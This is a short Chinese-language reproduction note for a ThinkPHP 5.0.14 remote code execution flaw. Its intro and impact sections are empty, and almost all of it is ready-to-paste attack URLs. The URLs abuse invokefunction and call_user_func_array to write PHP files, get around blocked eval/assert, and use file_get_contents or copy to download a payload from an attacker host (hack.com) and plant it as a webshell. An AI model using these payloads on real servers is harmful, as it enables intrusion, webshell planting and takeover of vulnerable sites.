Thinkphp 5.0.14
===============

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 1、常规命令

    ?s=index/think\app/invokefunction&function=&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php.jpg&vars[1][]=%3C?php%20phpinfo();?3E

### 2、eval（\'\'）和assert（\'\'）被拦截，命令函数被禁止

    http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo();
    http://www.xxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_GET[1])&1=call_user_func_array("file_put_contents",array("3.php",file_get_contents("https://www.hack.com/xxx.js")));

### 3、基于php7.2环境下

    http://www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=1.txt&vars[1][1]=1
    http://www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]=<?=file_put_contents('index111.php',file_get_contents('https://www.hack.com/xxx.js'));?>
    写进去发现转义了尖括号

### 4、通过copy函数

     http://www.xxxx.cn/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][0]= https://www.hack.com/xxx.js&vars[1][1]=112233.ph
